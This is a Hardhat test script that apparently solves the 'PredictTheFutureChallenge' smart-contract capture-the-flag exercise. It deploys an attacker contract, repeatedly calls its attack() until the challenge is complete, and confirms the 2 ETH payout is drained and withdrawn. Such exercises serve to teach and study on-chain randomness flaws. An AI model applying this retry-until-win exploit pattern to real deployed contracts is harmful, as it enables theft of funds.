const { loadFixture } = require("@nomicfoundation/hardhat-toolbox/network-helpers");
const { expect } = require("chai");
const { fixtureFactory } = require("../utils");

it("Solves PredictTheFutureChallenge", async function () {
  const fixture = () => fixtureFactory("PredictTheFutureChallenge", ethers.parseEther("1.0"));
  const contract = await loadFixture(fixture);

  const address = await contract.getAddress();
  const attacterFixture = () => fixtureFactory("PredictTheFutureChallengeAttacker", 0, address);
  const attackerContract = await loadFixture(attacterFixture);

  await attackerContract.lockInGuess({value: ethers.parseEther("1.0")});
  for (let i = 0; ; ++i) {
    const isComplete = await contract.isComplete();
    if (isComplete) {
      break;
    }
    try {
      await attackerContract.attack();
      console.log("Attack success after", i, "tries");
    } catch (err) {
    }
  }

  expect(await contract.isComplete()).to.equal(true);
  expect(await contract.runner.provider.getBalance(await attackerContract.getAddress())).to.equal(ethers.parseEther("2.0"));
  await attackerContract.withdraw();
  expect(await contract.runner.provider.getBalance(await attackerContract.getAddress())).to.equal(ethers.parseEther("0.0"));
});
